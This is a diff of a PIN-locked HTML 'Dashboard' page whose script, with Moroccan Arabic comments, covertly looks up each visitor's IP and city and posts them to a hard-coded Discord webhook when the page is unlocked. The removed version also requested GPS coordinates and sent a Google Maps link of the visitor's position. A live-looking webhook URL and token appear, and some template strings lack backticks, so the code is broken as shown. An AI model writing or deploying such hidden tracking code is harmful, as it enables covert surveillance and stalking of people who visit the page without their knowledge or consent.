@@ -3,25 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التتبع</title>
+    <title>Dashboard</title>
     <style>
-        :root { --primary: #4f46e5; --dark: #1e293b; --light: #f8fafc; }
-        body { margin: 0; font-family: sans-serif; background: #e2e8f0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; box-sizing: border-box; text-align: center; outline: none; font-size: 18px; }
-        .btn-main { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
-        #main-content { display: none; width: 100%; height: 100vh; flex-direction: column; }
+        body { margin: 0; font-family: sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 280px; }
+        input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; text-align: center; font-size: 16px; }
+        button { background: #4f46e5; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; cursor: pointer; font-weight: bold; }
+        #main-content { display: none; width: 100%; height: 100vh; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
     <div id="lock-screen" class="login-box">
-        <div style="font-size: 40px;">🔒</div>
-        <h2>دخول آمن</h2>
-        <input type="password" id="passInput" placeholder="كود الأمان">
-        <button class="btn-main" onclick="handleUnlock()">دخول</button>
-        <p id="msg" style="color: red; font-size: 13px; margin-top: 10px;"></p>
+        <h2>🔒 كود الدخول</h2>
+        <input type="password" id="passInput" placeholder="أدخل 1234">
+        <button onclick="handleUnlock()">دخول</button>
+        <p id="msg" style="color: red; font-size: 12px;"></p>
     </div>
 
     <div id="main-content">
@@ -29,56 +27,38 @@
     </div>
 
     <script>
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
-
-        async function sendToDiscord(locationInfo = "GPS غير متاح") {
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚨 تنبيه دخول جديد",
-                            color: 5814783,
-                            fields: [
-                                { name: "📍 المدينة", value: ipData.city || "غير معروف", inline: true },
-                                { name: "🌐 IP", value: ipData.ip || "غير معروف", inline: true },
-                                { name: "🗺️ الموقع", value: locationInfo }
-                            ]
-                        }]
-                    })
-                });
-            } catch (e) { console.log("Log Error"); }
-        }
+        // الرابط ديالك (تأكدي أنه صحيح ومافيهش فراغات)
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwdF92Ib1ECYK";
 
         function handleUnlock() {
             const pin = document.getElementById('passInput').value;
             
             if (pin === "1234") {
-                // دخول فوري بدون انتظار
+                // 1. إظهار الموقع فوراً (هادي هي أهم خطوة)
                 document.getElementById('lock-screen').style.display = 'none';
-                document.getElementById('main-content').style.display = 'flex';
-                document.body.style.background = "white";
+                document.getElementById('main-content').style.display = 'block';
 
-                // محاولة إرسال التتبع في الخلفية
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const mapUrl = https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
-                            sendToDiscord(mapUrl);
-                        },
-                        () => { sendToDiscord(); },
-                        { timeout: 5000 }
-                    );
-                } else {
-                    sendToDiscord();
-                }
+                // 2. إرسال التتبع في الخلفية (حتى لو فشل، الموقع غيبقى خدام)
+                sendTracking();
             } else {
-                document.getElementById('msg').innerText = "الكود غير صحيح!";
-                document.getElementById('passInput').value = "";
+                document.getElementById('msg').innerText = "الكود خطأ!";
+            }
+        }
+
+        async function sendTracking() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: 🚨 دخول جديد: ${data.city || 'غير معروف'} | IP: ${data.ip}
+                    })
+                });
+            } catch (e) {
+                console.log("Tracking failed but site is open");
             }
         }
     </script>
